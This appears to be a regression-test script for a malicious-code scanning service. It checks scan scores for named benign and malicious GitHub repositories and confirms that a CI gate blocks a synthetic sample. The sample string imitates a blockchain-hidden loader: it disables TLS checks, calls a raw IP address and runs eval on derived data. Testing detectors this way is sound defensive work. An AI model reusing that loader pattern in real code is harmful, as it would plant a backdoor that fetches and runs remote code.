const BASE=process.env.C2LEDGER_URL||"https://c2ledger-engine-production.up.railway.app";
async function json(url,init){const r=await fetch(url,init);const j=await r.json();return {r,j}}
const {r:pr,j:p}=await json(BASE+"/api/proof");
if(!pr.ok||p.gate!=="PASS"||p.driftSentinel?.status!=="PASS"||p.releaseControl?.status!=="PASS") throw new Error("proof gate failed");
const cases=[
 ["WAGMI","https://github.com/wevm/wagmi","benign"],
 ["FASTIFY","https://github.com/fastify/fastify","benign"],
 ["ETHERHIDING","https://github.com/SAAITAAMAA/EtherHiding","positive"],
 ["GENIE","https://github.com/lmu-plai/GENIE","archive"],
 ["DATADOG","https://github.com/DataDog/malicious-software-packages-dataset","archive"]
];
const rows={};
for(const [name,repo,kind] of cases){
 const {r,j}=await json(BASE+"/api/scan/github",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({repoUrl:repo})});
 if(!r.ok)throw new Error(name+" HTTP "+r.status+" "+JSON.stringify(j));
 rows[name]={score:j.score,verdict:j.verdict,archivesScanned:j.archivesScanned||0,archiveEntriesScanned:j.archiveEntriesScanned||0};
 if(kind==="benign"&&j.score>=30)throw new Error(name+" false-positive regression: "+j.score);
 if(kind==="positive"&&j.score<55)throw new Error(name+" positive regression: "+j.score);
 if(kind==="archive"&&(!(j.archivesScanned>0)||!(j.archiveEntriesScanned>0)))throw new Error(name+" archive coverage regression");
}
const bad="const p=new ethers.JsonRpcProvider('https://rpc.example.invalid');const tx={to:'0xabc'};const x=tx.to.slice(2);process.env.NODE_TLS_REJECT_UNAUTHORIZED='0';fetch('http://181.214.149.148:443');eval(x)";
const {r:cr,j:cj}=await json(BASE+"/api/ci/gate?threshold=55",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({content:bad,path:"ci-regression.js"})});
if(cr.status!==422||cj.decision?.status!=="FAIL"||(cj.result?.score||0)<80)throw new Error("malicious CI fixture was not blocked");
console.log(JSON.stringify({status:"PASS",version:p.version,proof:p.gate,rows,syntheticBlocked:true},null,2));
